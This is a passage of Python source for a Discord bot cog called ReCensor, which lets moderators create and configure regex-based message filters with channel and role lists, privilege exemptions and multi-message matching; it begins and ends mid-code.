    def compiled(self):
        if not self._compiled:
            predicate, compiled = self.rebuild_predicate()
            return compiled

        return self._compiled

    def check_meta(self, message: Message, cache=None, debug=False):
        """
        Return True if message is eligible for regex check
        """
        if not self.enabled:
            if debug:
                return False, 'disabled'
            return False

        if cache is None:
            cache = {}

        if 'mos' in cache:
            mos = cache['mos']
        else:
            cache['mos'] = mos = self.parent.cog.is_mod_or_superior(message)

        if mos:
            if self.priv_exempt:
                if debug:
                    return False, 'immediate priv_exempt'
                return False
            elif self.priv_exempt is None and self.parent.priv_exempt:
                if debug:
                    return False, 'parent priv_exempt'
                return False

        if self.channels_list in cache:
            clr = cache[self.channels_list]
        else:
            cache[self.channels_list] = clr = self.channels_list.check(message.channel)

        if clr is False:
            if debug:
                return False, 'not in channel list'
            return False

        if self.roles_list in cache:
            rlr = cache[self.roles_list]
        else:
            cache[self.roles_list] = rlr = self.roles_list.check_iter(message.author.roles)

        if rlr is False:
            if debug:
                return False, 'not in role list'
            return False

        if debug:
            return True, 'meta matched'
        return True

    def to_json(self):
        data = {
            'asciify'           : self.asciify,
            'attachment_header' : self.attachment_header,
            'enabled'           : self.enabled,
            'flags'             : self.flags,
            'mode'              : self.mode,
            'multi_msg'         : self.multi_msg,
            'multi_msg_join'    : self.multi_msg_join,
            'multi_msg_group'   : self.multi_msg_group,
            'override'          : self.override,
            'pattern'           : self.pattern,
            'position'          : self.position.value,
            'priv_exempt'       : self.priv_exempt
        }

        for k in ['roles_list', 'channels_list']:
            if k in self.links:
                data[k + '_link'] = self.links[k].name
            else:
                data[k] = getattr(self, k).to_json()

        return data

    def copy(self, new_name: str, link: bool = False, **kwargs):
        new_kwargs = dict(
            pattern=self.pattern,
            flags=self.flags,
            mode=self.mode,
            enabled=False,
            override=self.override,
            priv_exempt=self.priv_exempt,
            position=self.position,
            attachment_header=self.attachment_header,
            multi_msg=self.multi_msg,
            multi_msg_group=self.multi_msg_group,
            multi_msg_join=self.multi_msg_join,
            asciify=self.asciify
        )

        new_kwargs.update(kwargs)

        for list_name in ['roles_list', 'channels_list']:
            if link:
                new_kwargs[list_name + '_link'] = self.name
            else:
                new_kwargs[list_name] = getattr(self, list_name)

        return type(self)(self.parent, new_name, **new_kwargs)

    @property
    def filter_priority(self):
        #  p e o m
        #  3 1 1 0
        #  2 1 1 1
        #  1 1 0 1
        #  0 1 0 0
        # -1 0 x x
        if not self.enabled:
            return -1
        elif self.override:
            return 2 + int(not self.mode)

        return int(self.mode)


class ReCensor:
    """
    Filter messages using regular expressions
    """

    # Old data format:
    # {
    #  server_id (str): {
    #   channel_id (str): {
    #     regex (str): mode (str from MODES)
    #     }
    #   }
    # }
    #
    # New data format:
    # {
    #   server_id (str): {
    #       'filters' : {
    #           name (str) : {
    #               'asciify'           : tristate (default null),
    #               'attachment_header' : bool (default false),
    #               'enabled'           : bool (default false),
    #               'flags'             : flags (str containing subset of AILUMSX, default DEFAULT_FLAGS),
    #               'mode'              : bool (default false),
    #               'multi_msg'         : bool (default false),
    #               'multi_msg_join'    : str (default CONCAT_JOIN),
    #               'multi_msg_group'   : int (default 0),
    #               'override'          : bool (default false),
    #               'pattern'           : pattern (str),
    #               'position'          : enum[str] (default POSITION.ANYWHERE),
    #               'channels_list'     : {
    #                       'mode'        :   tristate,
    #                       'items'       :   list[channel_id (str)]},
    #                       'overlay'     :   optional bool (default true)
    #                                   },
    #               'roles_list'        : {
    #                       'mode'        :   tristate,
    #                       'items'       :   list[channel_id (str)]},
    #                       'overlay'     :   optional bool (default true)
    #                                   },
    #               'priv_exempt'       : tristate
    #           }
    #       },
    #       'asciify'       : bool (default false),
    #       'priv_exempt'   : bool (default true),
    #       'roles_list'    : {
    #                   'mode'  :   tristate,
    #                   'items' :   list[channel_id (str)]}
    #       },
    #       'channels_list' : {
    #                   'mode'  :   tristate,
    #                   'items' :   list[channel_id (str)]}
    #       },
    #   }
    # }

    def __init__(self, bot):
        self.bot = bot
        self.ready = False

        self.executor = ExecutorClass()
        self.settings = {}
        self.misc_data = {}
        self._ignore_filters = {}
        self._message_cache = defaultdict(lambda: BoundedOrderedDict(maxlen=MSG_HISTORY_MAX_NUM))
        self._deleting = set()

        data = dataIO.load_json(JSON_PATH)
        if data.get('_schema_version', 1) < 2:
            data = migrate_data(data)
            dataIO.save_json(JSON_PATH, data)

        for k, v in data.items():
            if k.startswith('_') or type(v) is not dict or not k.isnumeric():
                self.misc_data[k] = v
            else:
                self.settings[k] = ServerConfig(self, **v)

        try:
            # noinspection PyUnresolvedReferences
            self.analytics = CogAnalytics(self)
        except Exception as e:
            self.bot.logger.exception(e)
            self.analytics = None

        self._list_functions = OrderedDict([
            ('help'       , self._list_command_help),
            ('enabled'    , self._list_command_enabled),
            ('mode'       , self._list_command_mode),
            ('overlay'    , self._list_command_overlay),
            ('add'        , self._list_command_add),
            ('remove'     , self._list_command_remove),
            ('clear'      , self._list_command_clear),
            ('cleanup'    , self._list_command_cleanup),
            ('invert'     , self._list_command_invert),
            ('link'       , self._list_command_link),
            ('unlink'     , self._list_command_unlink),
            ('replace'    , self._list_command_replace),
            ('union'      , self._list_command_union),
            ('difference' , self._list_command_difference),
            ('intersect'  , self._list_command_intersect),
            ('symdiff'    , self._list_command_symdiff)
        ])

        self.ready = True

    def __unload(self):
        self.ready = False
        self.executor.shutdown(wait=True)
        self.save()

    def save(self):
        data = {'_schema_version': 2}
        data.update(self.misc_data)
        data.update({k: v.to_json() for k, v in self.settings.items()})
        dataIO.save_json(JSON_PATH, data)

    @commands.group(name='recensor', pass_context=True, invoke_without_command=True, no_pm=True, rest_is_raw=True)
    @checks.mod_or_permissions(manage_messages=True)
    async def recensor(self, ctx, filter_name: str, setting_name: str = None, *, options):
        """
        Configure regular expression censorship

        If a filter name is provided instead of a subcommand:
        - If no command is provided, invoke [p]recensor show filter_name
        - Otherwise, invoke [p]recensor set setting_name filter_name options...
        """
        if ctx.invoked_subcommand is not None:
            return
        elif setting_name:
            new_view = '%s "%s"' % (setting_name, filter_name)

            if options:
                new_view += ' ' + options

            ctx.view = StringView(new_view)
            await self.recensor_set.invoke(ctx)
        elif filter_name in self.recensor_set.commands:
            new_view = filter_name

            if setting_name:
                new_view += ' ' + setting_name

            if options:
                new_view += ' ' + options

            ctx.view = StringView(new_view)
            await self.recensor_set.invoke(ctx)
        else:
            settings = self.settings.get(ctx.message.server.id)
            name = filter_name and filter_name.lower()

            if not (settings and settings.get_filter(name)):
                await self.bot.say(warning('There is no command or filter in this server named "%s".' % name))
                return

            ctx.command = self.recensor_list
            await ctx.invoke(self.recensor_list, filter_name)

    @recensor.command(pass_context=True, name='help')
    async def recensor_help(self, ctx):
        """
        Posts links to online reference material
        """
        await self.bot.say(
            "ReCensor manual: <https://github.com/calebj/calebj-cogs/#recensor>\n"
            "A how-to for Python's regex: <https://docs.python.org/3/howto/regex.html>\n"
            "Full docs on regex syntax: <https://docs.python.org/3/library/re.html#regular-expression-syntax>"
        )

    @recensor.command(pass_context=True, name='list', aliases=['show'])
    @checks.mod_or_permissions(manage_messages=True)
    async def recensor_list(self, ctx, filter_name: str = None):
        """
        Displays all or one filter(s)

        If no filter_name is specified, show all filters + server info.
        If filter_name is 'server', only show server info.
        """
        server = ctx.message.server
        settings = self.settings.get(server.id)
        filter_name = filter_name and filter_name.lower()

        if not (settings and settings.filters):
            await self.bot.say(info('There are no filters in this server to show.'))
            return
        elif filter_name and filter_name != 'server' and not settings.get_filter(filter_name):
            await self.bot.say(warning('There is no filter named "%s" in this server.' % filter_name))
            return

        def format_list(_filter: FilterBase, name: str, elaborate_link: bool = False):
            _list = getattr(_filter, name)
            lines = []
            linked = (_list.parent is not _filter)

            if isinstance(_filter, Filter) and linked:  # note: server lists won't ever be linked
                ult_parent = _list.parent
                parent = _filter.links[name]
                lines.append('Linked to: ' + parent.name)

                if ult_parent != parent:
                    lines.append('Link dest: ' + ult_parent.name)

            if not linked or elaborate_link:
                # lines.append('enabled: ' + ('yes' if _list.enabled else 'no'))
                lines.append('Mode: ' + ('whitelist' if _list.mode else 'blacklist'))

                if _list.overlay is not None:
                    lines.append('Overlay: ' + ('yes' if _list.overlay else 'no'))

                item_fmt = MENTIONS_BY_DATACLASS.get(_list.item_type, '#%s')

                if _list.items:
                    lines.append('Items (%i):' % len(_list.items))
                    items = [(item_fmt % i) for i in _list.items]
                    items.sort()
                    lines.extend(items)
                else:
                    lines.append('Items: (none)')

            return '\n'.join(lines)

        def format_params(obj):
            order = ['Mode', 'ASCIIfy', 'Privilege exempt', 'Override', 'Position',
                     'Attachment Header', 'Multi-message', 'Multi-message join']

            params = {
                'Priv. exempt' : ('yes' if obj.priv_exempt else 'no'),
                'ASCIIfy'      : ('yes' if obj.asciify else 'no'),
            }

            if type(obj) is Filter:
                params.update({
                    'Enabled'           : ('yes' if obj.enabled else 'no'),
                    'Mode'              : ('white' if obj.mode else 'black'),
                    'Override'          : ('yes' if obj.override else 'no'),
                    'Multi-message'     : ('yes' if obj.multi_msg else 'no'),
                    'Flags'             : obj.flags or '(none)',
                    'Position'          : obj.position.value,
                    'Attachment Header' : ('yes' if obj.attachment_header else 'no')
                })

                if obj.multi_msg:
                    if obj.multi_msg_join:
                        join = obj.multi_msg_join.encode('unicode_escape').decode()
                        params['Multi-message'] += ', joined with `"%s"`' % join
                    else:
                        params['Multi-message'] += ', joined with `""` (empty string)'

                    if obj.multi_msg_group:
                        params['Multi-message'] += ', group #%i' % obj.multi_msg_group

                if obj.priv_exempt is None:
                    params['Privilege exempt'] = 'inherited (%s)' % ('yes' if obj.parent.priv_exempt else 'no')

                if obj.asciify is None:
                    params['ASCIIfy'] = 'inherited (%s)' % ('yes' if obj.parent.asciify else 'no')

            return '\n'.join((k + ': ' + params[k]) for k in order if k in params)

        if filter_name is None:
            objects = [settings] + [v for k, v in sorted(settings.filters.items())]
        elif filter_name == 'server':
            objects = [settings]
        else:
            objects = [settings.get_filter(filter_name)]

        embeds = []

        for item in objects:
            description = format_params(item)

            if isinstance(item, ServerConfig):
                title = 'Server Configuration/Defaults'
                color = discord.Color.blue()
            else:
                title = 'Filter: ' + item.name
                pattern_name = 'Pattern'

                if not item.predicate:
                    pattern_name += ' (INVALID!)'

                description += ('\n\n%s:\n' % pattern_name) + box(item.pattern)
                if item.enabled:
                    color = discord.Color.green() if item.mode else discord.Color.red()
                else:
                    title += ' (disabled)'
                    color = discord.Color.dark_green() if item.mode else discord.Color.dark_red()

            embed = discord.Embed(title=title, description=description, color=color)

            for list_name in ['channels_list', 'roles_list']:
                field_name = list_name.replace('_', ' ').title()

                if not getattr(item, list_name).enabled:
                    field_name += ' (disabled)'

                embed.add_field(name=field_name, value=format_list(item, list_name, elaborate_link=bool(filter_name)))

            if isinstance(item, Filter):
                flags_val = '\n'.join('`%c` - %s' % (k, FLAGS_DESC[k]) for k in item.flags) or '(none)'
                embed.add_field(name='Flags', value=flags_val)

            embeds.append(embed)

        for embed in embeds:
            await self.bot.say(embed=embed)

    @recensor.command(pass_context=True, name='create', aliases=['add'], rest_is_raw=True)
    @checks.mod_or_permissions(manage_messages=True)
    async def recensor_create(self, ctx, name: str, *, pattern: str = None):
        """
        Creates a new filter
        """
        server = ctx.message.server
        name = name.lower()
        name_check = self.check_name(ctx, name)
        settings = self.settings.get(server.id)
        pattern = pattern.lstrip(' ')
        kwargs = {}

        if len(pattern) >= 2 and pattern[0] == pattern[-1] == '"':
            pattern = pattern[1:-1]

        if name_check:
            await self.bot.say(name_check)
            return
        elif not settings:
            self.settings[server.id] = settings = ServerConfig(self)

        if pattern:
            try:
                re.compile(pattern, flags_to_int(DEFAULT_FLAGS))
            except Exception as e:
                await self.bot.say(error("Error compiling regular expression:\n") +
                                   box(', '.join((x if type(x) is str else repr(x)) for x in e.args)))
                return

            inline_flags = re.match(r"^\(\?([a-z]+)\)(.*)", pattern, re.IGNORECASE | re.DOTALL)

            if inline_flags:
                flags, pattern = inline_flags.groups()
                kwargs['flags'] = ''.join(sorted(set(flags.upper()).intersection(FLAGS_DESC)))
                desc = 'and pattern set (auto-converted inline flags).'
            else:
                desc = 'and pattern set.'

            kwargs['pattern'] = pattern
        else:
            desc = ''

        try:
            settings.add_filter(name, **kwargs)
        except Exception as e:
            await self.bot.say(error(', '.join((x if type(x) is str else repr(x)) for x in e.args)))
            return

        self.save()
        await self.bot.say(info('Filter created%s. Configure it with `%srecensor %s [setting] [options]`'
                                % (desc, ctx.prefix, name)))

    @recensor.command(pass_context=True, name='delete', aliases=['rm'])
    @checks.mod_or_permissions(manage_messages=True)
    async def recensor_delete(self, ctx, name: str):
        """
        Deletes a filter
        """
        server = ctx.message.server
        settings = self.settings.get(server.id)
        name = name.lower()

        if not (settings and settings.get_filter(name)):
            await self.bot.say(warning('There is no filter named "%s" in this server.' % name))
            return

        if await self.confirm_thing(ctx, thing='delete the `%s` filter' % name):
            try:
                settings.delete_filter(name)
            except Exception as e:
                await self.bot.say(error(', '.join((x if type(x) is str else repr(x)) for x in e.args)))
                return

            self.save()
            await self.bot.say(info("Filter deleted."))

    @recensor.command(pass_context=True, name='rename')
    @checks.mod_or_permissions(manage_messages=True)
    async def recensor_rename(self, ctx, name: str, new_name: str):
        """
        Renames a filter
        """
        server = ctx.message.server
        settings = self.settings.get(server.id)
        name = name.lower()
        new_name = new_name.lower()
        name_check = self.check_name(ctx, new_name)

        if not (settings and settings.get_filter(name)):
            await self.bot.say(warning('There is no filter named "%s" in this server.' % name))
            return
        if name_check:
            await self.bot.say(name_check)
            return

        try:
            settings.rename_filter(name, new_name)
        except Exception as e:
            await self.bot.say(error(', '.join((x if type(x) is str else repr(x)) for x in e.args)))
            return

        self.save()
        await self.bot.say(info("Successfully renamed '%s' to '%s'." % (name, new_name)))

    @recensor.command(pass_context=True, name='copy')
    @checks.mod_or_permissions(manage_messages=True)
    async def recensor_copy(self, ctx, name: str, new_name: str, linked: bool = False):
        """
        Copies an existing filter, with optional link

        If the linked argument is a true-ish value, the new filter's lists will be linked to the original's
        """
        server = ctx.message.server
        settings = self.settings.get(server.id)
        name = name.lower()
        new_name = new_name.lower()
        name_check = self.check_name(ctx, new_name)

        if not (settings and settings.get_filter(name)):
            await self.bot.say(warning('There is no filter named "%s" in this server.' % name))
            return
        if name_check:
            await self.bot.say(name_check)
            return

        try:
            settings.copy_filter(name, new_name, link=bool(linked))
        except Exception as e:
            await self.bot.say(error(', '.join((x if type(x) is str else repr(x)) for x in e.args)))
            return

        self.save()
        list_op = 'linked' if linked else 'duplicated'
        await self.bot.say(info("Created a copy of '%s' named '%s' with %s lists." % (name, new_name, list_op)))

    @recensor.group(pass_context=True, name='server')
    @checks.admin_or_permissions(manage_server=True)
    async def recensor_server(self, ctx):
        """
        Show or configure server settings

        If no subcommand is provided, invokes [p]recensor show server
        """
        if ctx.invoked_subcommand is None:
            return await self.bot.send_cmd_help(ctx)
        elif ctx.invoked_subcommand is self.recensor_server:
            ctx.view = StringView('SERVER')
            return await self.recensor_list.invoke(ctx)

    @recensor_server.command(pass_context=True, name='priv-exempt')
    async def recensor_server_priv_exempt(self, ctx, priv_exempt: bool = None):
        """
        Configures privileged user exemption

        This setting acts as the default for when a filter's priv_exempt
        this parameter is set to 'inherit'. If enabled, the server owner,
        moderator role and admin role (according to [p]set) are ignored by
        the filter.
        """
        server = ctx.message.server
        settings = self.settings.get(server.id)

        if type(priv_exempt) not in (bool, type(None)):
            priv_exempt = await ctx.command.do_conversion(ctx, bool, priv_exempt)

        if not settings:
            self.settings[server.id] = settings = ServerConfig(self)
            self.save()

        if priv_exempt is None:
            priv_exempt = settings.priv_exempt
            adj = 'currently'
        elif settings.priv_exempt == priv_exempt:
            adj = 'already'
        else:
            adj = 'now'
            settings.priv_exempt = priv_exempt
            self.save()

        desc = 'enabled' if priv_exempt else 'disabled'
        await self.bot.say('Server-wide privilege user exemption for is %s %s by default.' % (adj, desc))

    @recensor_server.command(pass_context=True, name='asciify')
    async def recensor_server_asciify(self, ctx, asciify: bool = None):
        """
        Show/set server-wide ASCIIfy toggle

        If enabled, the filters will attempt to reduce unicode text to its equivalent ASCII before matching by default

        For full effectiveness, unidecode must be installed

        asciify must be a boolean option or left blank to show the current setting
        """
        server = ctx.message.server
        settings = self.settings.get(server.id)

        if type(asciify) not in (bool, type(None)):
            asciify = await ctx.command.do_conversion(ctx, bool, asciify)

        if not settings:
            self.settings[server.id] = settings = ServerConfig(self)
            self.save()

        if asciify is None:
            asciify = settings.asciify
            adj = 'currently'
        elif settings.asciify == asciify:
            adj = 'already'
        else:
            adj = 'now'
            settings.asciify = asciify
            self.save()

        msg = 'ASCIIfy is %s %s by default.' % (adj, 'enabled' if asciify else 'disabled')

        if not unidecode:
            msg += '\n\n' + warning("Note that the `unidecode` package is not installed on the bot, so this feature "
                                    "will not be fully functional. The bot owner should run:\n"
                                    "`%sdebug bot.pip_install('unidecode')`\nand then reload this cog." % ctx.prefix)

        await self.bot.say(msg)

    @recensor_server.command(pass_context=True, name='channels')
    async def recensor_server_channels(self, ctx, operation: str = None, *options):
        """
        Configures the server-wide channels list
        """
        server = ctx.message.server
        settings = self.settings.get(server.id)

        if not settings:
            self.settings[server.id] = settings = ServerConfig(self)
            self.save()
        elif not operation:
            ctx.view = StringView('SERVER')
            await self.recensor_list.invoke(ctx)

        await self._list_command_main(ctx, settings, 'channels_list', operation, *options)

    @recensor_server.command(pass_context=True, name='roles')
    async def recensor_server_roles(self, ctx, operation: str = None, *options):
        """
        Configure the server-wide roles list
        """
        server = ctx.message.server
        settings = self.settings.get(server.id)

        if not settings:
            self.settings[server.id] = settings = ServerConfig(self)
            self.save()
        elif not operation:
            ctx.view = StringView('SERVER')
            await self.recensor_list.invoke(ctx)

        await self._list_command_main(ctx, settings, 'roles_list', operation, *options)

    @recensor.group(pass_context=True, name='set', hidden=True, invoke_without_command=True, rest_is_raw=True)
    @checks.mod_or_permissions(manage_messages=True)
    async def recensor_set(self, ctx, filter_name: str, setting_name: str = None, *, options):
        """
        Configures filter parameters

        If a filter name is is provided but no setting, invokes [p]recensor show filter_name.
        If filter_name is 'server', redirect to [p]recensor server
        Otherwise, if a filter name and subcommand are provided, invokes that subcommand.
        """
        if filter_name.lower() == 'server':
            new_view = []

            if setting_name:
                new_cmd = self.recensor_server
                new_view.append(setting_name)
            else:
                new_cmd = self.recensor_list
                new_view.append('SERVER')

            if options:
                new_view.append(options)

            ctx.view = StringView(' '.join(new_view))
            return await new_cmd.invoke(ctx)
        else:
            settings = self.settings.get(ctx.message.server.id)
            if not (settings and settings.get_filter(filter_name)):
                return await self.bot.send_cmd_help(ctx)

        if setting_name in [None, self.recensor_list.name, *self.recensor_list.aliases]:
            ctx.view = StringView('"%s"' % filter_name)
            return await self.recensor_list.invoke(ctx)
        elif setting_name in self.recensor_set.commands:
            new_view = '"%s"' % filter_name

            if options:
                new_view += ' ' + options

            ctx.view = StringView(new_view)
            return await self.recensor_set.commands[setting_name].invoke(ctx)
        else:
            return await self.bot.send_cmd_help(ctx)

    @recensor_set.command(pass_context=True, name='enabled')
    @checks.mod_or_permissions(manage_messages=True)
    async def recensor_set_enabled(self, ctx, filter_name: str, enabled: bool = None):
        """
        Show/set filter enabled/active toggle

        enabled must be a boolean option or left blank to show the current setting
        """
        server = ctx.message.server
        settings = self.settings.get(server.id)
        name = filter_name.lower()
        _filter = settings and settings.get_filter(name)

        if type(enabled) not in (bool, type(None)):
            enabled = await ctx.command.do_conversion(ctx, bool, enabled)

        if not _filter:
            await self.bot.say(warning('There is no filter named "%s" in this server.' % name))
            return
        elif enabled is None:
            enabled = _filter.enabled
            adj = 'currently'
        elif _filter.enabled == enabled:
            adj = 'already'
        else:
            adj = 'now'
            _filter.enabled = enabled
            settings.update_order()
            self.save()

        desc = 'enabled' if enabled else 'disabled'
        await self.bot.say('%s is %s %s.' % (_filter.name, adj, desc))

    @recensor_set.command(pass_context=True, name='disable', hidden=True)
    @checks.mod_or_permissions(manage_messages=True)
    async def recensor_set_disable(self, ctx, filter_name: str):
        """
        Disables a filter
        """
        server = ctx.message.server
        settings = self.settings.get(server.id)
        name = filter_name.lower()
        _filter = settings and settings.get_filter(name)

        if not _filter:
            await self.bot.say(warning('There is no filter named "%s" in this server.' % name))
            return
        elif not _filter.enabled:
            adj = 'already'
        else:
            adj = 'now'
            _filter.enabled = False
            settings.update_order()
            self.save()

        await self.bot.say('%s is %s disabled.' % (_filter.name, adj))

    @recensor_set.command(pass_context=True, name='enable', hidden=True)
    @checks.mod_or_permissions(manage_messages=True)
    async def recensor_set_enable(self, ctx, filter_name: str):
        """
        Enables a filter
        """
        server = ctx.message.server
        settings = self.settings.get(server.id)
        name = filter_name.lower()
        _filter = settings and settings.get_filter(name)

        if not _filter:
            await self.bot.say(warning('There is no filter named "%s" in this server.' % name))
            return
        elif _filter.enabled:
            adj = 'already'
        else:
            adj = 'now'
            _filter.enabled = True
            settings.update_order()
            self.save()

        await self.bot.say('%s is %s enabled.' % (_filter.name, adj))

    @recensor_set.command(pass_context=True, name='override')
    @checks.mod_or_permissions(manage_messages=True)
    async def recensor_set_override(self, ctx, filter_name: str, override: bool = None):
        """
        Show/set filter override/priority toggle

        override must be a boolean option or left blank to show the current setting
        """
        server = ctx.message.server
        settings = self.settings.get(server.id)
        name = filter_name.lower()
        _filter = settings and settings.get_filter(name)

        if type(override) not in (bool, type(None)):
            override = await ctx.command.do_conversion(ctx, bool, override)

        if not _filter:
            await self.bot.say(warning('There is no filter named "%s" in this server.' % name))
            return
        elif override is None:
            override = _filter.override
            adj = 'currently'
        elif _filter.override == override:
            adj = 'already'
        else:
            adj = 'now'
            _filter.override = override
            settings.update_order()
            self.save()

        desc = 'enabled' if override else 'disabled'
        await self.bot.say('Filter override for %s is %s %s.' % (_filter.name, adj, desc))

    @recensor_set.command(pass_context=True, name='priv-exempt')
    @checks.mod_or_permissions(manage_messages=True)
    async def recensor_set_priv_exempt(self, ctx, filter_name: str, priv_exempt: str = None):
        """
        Show/set filter privileged user exemption toggle

        priv_exempt must be a boolean option, 'inherit', or left blank to show the current setting
        """
        server = ctx.message.server
        settings = self.settings.get(server.id)
        name = filter_name.lower()
        _filter = settings and settings.get_filter(name)

        inherit = object()

        if type(priv_exempt) is str and priv_exempt.lower().strip("'`\" ") == 'inherit':
            priv_exempt = inherit
        elif type(priv_exempt) not in (bool, type(None)):
            priv_exempt = await ctx.command.do_conversion(ctx, bool, priv_exempt)

        if not _filter:
            await self.bot.say(warning('There is no filter named "%s" in this server.' % name))
            return
        elif priv_exempt is None:
            priv_exempt = _filter.priv_exempt
            adj = 'currently'
        elif _filter.priv_exempt == priv_exempt or (_filter.priv_exempt is None and priv_exempt is inherit):
            adj = 'already'
        else:
            adj = 'now'
            _filter.priv_exempt = None if priv_exempt is inherit else priv_exempt
            self.save()

        if priv_exempt in (None, inherit):
            desc = 'inherit (%s)' % ('enabled' if _filter.parent.priv_exempt else 'disabled')
        else:
            desc = 'enabled' if priv_exempt else 'disabled'

        await self.bot.say('Privilege user exemption for %s is %s %s.' % (_filter.name, adj, desc))

    @recensor_set.command(pass_context=True, name='asciify')
    @checks.mod_or_permissions(manage_messages=True)
    async def recensor_set_asciify(self, ctx, filter_name: str, asciify: str = None):
        """
        Show/set filter ASCIIfy toggle

        If enabled, the filter will attempt to reduce unicode text to its equivalent ASCII before matching

        For full effectiveness, unidecode must be installed

        asciify must be a boolean option, 'inherit', or left blank to show the current setting
        """
        server = ctx.message.server
        settings = self.settings.get(server.id)
        name = filter_name.lower()
        _filter = settings and settings.get_filter(name)

        inherit = object()

        if type(asciify) is str and asciify.lower().strip("'`\" ") == 'inherit':
            asciify = inherit
        elif type(asciify) not in (bool, type(None)):
            asciify = await ctx.command.do_conversion(ctx, bool, asciify)

        if not _filter:
            await self.bot.say(warning('There is no filter named "%s" in this server.' % name))
            return
        elif asciify is None:
            asciify = _filter.asciify
            adj = 'currently'
        elif _filter.asciify == asciify or (_filter.asciify is None and asciify is inherit):
            adj = 'already'
        else:
            adj = 'now'
            _filter.asciify = None if asciify is inherit else asciify
            self.save()

        if asciify in (None, inherit):
            desc = 'inherit (%s)' % ('enabled' if _filter.parent.asciify else 'disabled')
        else:
            desc = 'enabled' if asciify else 'disabled'

        msg = 'ASCIIfy for %s is %s %s.' % (_filter.name, adj, desc)

        if not unidecode:
            msg += '\n\n' + warning("Note that the `unidecode` package is not installed on the bot, so this feature "
                                    "will not be fully functional. The bot owner should run:\n"
                                    "`%sdebug bot.pip_install('unidecode')`\nand then reload this cog." % ctx.prefix)

        await self.bot.say(msg)

    @recensor_set.command(pass_context=True, name='multi-msg', aliases=['multi'])
    @checks.mod_or_permissions(manage_messages=True)
    async def recensor_set_multi_msg(self, ctx, filter_name: str, multi_msg: bool = None):
        """
        Show/set filter multi-message search toggle

        When enabled, the filter will check the last 64 messages or 10 minutes
        of messages per user per channel for a match. Matched spans of messages
        will be deleted as a group. Only works in blacklist mode.

        multi_msg must be a boolean option or left blank to show the current setting
        """
        server = ctx.message.server
        settings = self.settings.get(server.id)
        name = filter_name.lower()
        _filter = settings and settings.get_filter(name)

        if type(multi_msg) not in (bool, type(None)):
            multi_msg = await ctx.command.do_conversion(ctx, bool, multi_msg)

        if not _filter:
            await self.bot.say(warning('There is no filter named "%s" in this server.' % name))
            return
        elif multi_msg is None:
            multi_msg = _filter.multi_msg
            adj = 'currently'
        elif _filter.multi_msg == multi_msg:
            adj = 'already'
        else:
            adj = 'now'
            _filter.multi_msg = multi_msg
            self.save()

        desc = 'enabled' if multi_msg else 'disabled'
        msg = 'Multi-message search for %s is %s %s.' % (_filter.name, adj, desc)

        await self.bot.say(msg)

    @recensor_set.command(pass_context=True, name='multi-join')
    @checks.mod_or_permissions(manage_messages=True)
    async def recensor_set_multi_msg_join(self, ctx, filter_name: str, join: str = None):
        """
        Show/set multi-message join

        join must be an escaped string (double quotes can be used for spaces), or left blank to show the current setting

        For example, "\\n" is translated into a newline for the join, and " " is stored as a simple space.
        "" (an empty string) is also acceptable.
        """
        server = ctx.message.server
        settings = self.settings.get(server.id)
        name = filter_name.lower()
        _filter = settings and settings.get_filter(name)

        join = join and bytes(join, "utf-8").decode("unicode_escape")

        if not _filter:
            await self.bot.say(warning('There is no filter named "%s" in this server.' % name))
            return
        elif join is None:
            join = _filter.multi_msg_join
            adj = 'currently'
        elif _filter.multi_msg_join == join:
            adj = 'already'
        else:
            adj = 'now'
            _filter.multi_msg_join = join
            self.save()

        disp = '`"%s"`' % join.encode('unicode_escape').decode()

        if join == '':
            disp += ' (empty string)'

        await self.bot.say('Multi-message join for %s is %s set to %s.' % (_filter.name, adj, disp))

    @recensor_set.command(pass_context=True, name='multi-group')
    @checks.mod_or_permissions(manage_messages=True)
    async def recensor_set_multi_msg_group(self, ctx, filter_name: str, group: int = None):
        """
        Show/set multi-message group ID

        If set, the section of a match belonging to this group is deleted instead of the whole series.
        This does nothing in whitelist mode (it's forced to use the whole match)
        """
        server = ctx.message.server
        settings = self.settings.get(server.id)
        name = filter_name.lower()
        _filter = settings and settings.get_filter(name)

        if not _filter:
            await self.bot.say(warning('There is no filter named "%s" in this server.' % name))
            return
        elif group is None:
            group = _filter.multi_msg_group
            adj = 'currently'
        elif _filter.multi_msg_group == group:
            adj = 'already'
        else:
            try:
                compiled = re.compile(_filter.pattern, flags_to_int(_filter.flags))
            except Exception as e:
                await self.bot.say(error("Error compiling regular expression:\n") +
                                   box(', '.join((x if type(x) is str else repr(x)) for x in e.args)))
                return

            if group > compiled.groups:
                await self.bot.say(warning("This filter's pattern only has %i groups. Current pattern:\n%s"
                                           % (compiled.groups, box(_filter.pattern))))
                return

            adj = 'now'
            _filter.multi_msg_group = group
            self.save()

        await self.bot.say('Multi-message group for %s is %s %i.' % (_filter.name, adj, group))

    @recensor_set.command(pass_context=True, name='mode')
    @checks.mod_or_permissions(manage_messages=True)
    async def recensor_set_mode(self, ctx, filter_name: str, mode: str = None):
        """
        Show/set filter matching mode

        mode MUST be blacklist, whitelist, or left blank to show the current setting
        """
        server = ctx.message.server
        settings = self.settings.get(server.id)
        name = filter_name.lower()
        _filter = settings and settings.get_filter(name)

        if mode.lower().startswith('black'):
            mode = False
        elif mode.lower().startswith('white'):
            mode = True
        else:
            return await self.bot.send_cmd_help(ctx)

        if not _filter:
            await self.bot.say(warning('There is no filter named "%s" in this server.' % name))
            return
        elif mode is None:
            mode = _filter.mode
            adj = 'currently'
        elif _filter.mode == mode:
            adj = 'already'
        else:
            adj = 'now'
            _filter.mode = mode
            settings.update_order()
            self.save()

        desc = 'DO' if mode else 'do NOT'
        await self.bot.say('%s is %s set to only allow messages that %s match its pattern.'
                           % (_filter.name, adj, desc))

    @recensor_set.command(pass_context=True, name='position')
    @checks.mod_or_permissions(manage_messages=True)
    async def recensor_set_position(self, ctx, filter_name: str, position: str = None):
        """
        Configures a filter's matching position

        Position MUST be one of the following (or left blank to show the current value):
        - start:    only looks at the beginning of the message
        - anywhere: scans through the full message looking for a match
        - full:     the entire message must match, from start to finish

        This does nothing in multi-message whitelist mode (all matches are scanned)
        """
        server = ctx.message.server
        settings = self.settings.get(server.id)
        name = filter_name.lower()
        _filter = settings and settings.get_filter(name)

        if not _filter:
            await self.bot.say(warning('There is no filter named "%s" in this server.' % name))
            return

        try:
            position = position and POSITION(position)
        except ValueError:
            return await self.bot.send_cmd_help(ctx)

        if position is None:
            position = _filter.position
            adj = 'currently'
        elif _filter.position == position:
            adj = 'already'
        else:
            adj = 'now'
            _filter.position = position
            self.save()

        if position is POSITION.START:
            desc = 'only at the beginning of the message'
        elif position is POSITION.FULL:
            desc = 'the entire message from start to finish'
        elif position is POSITION.ANYWHERE:
            desc = 'anywhere in the message'
        else:
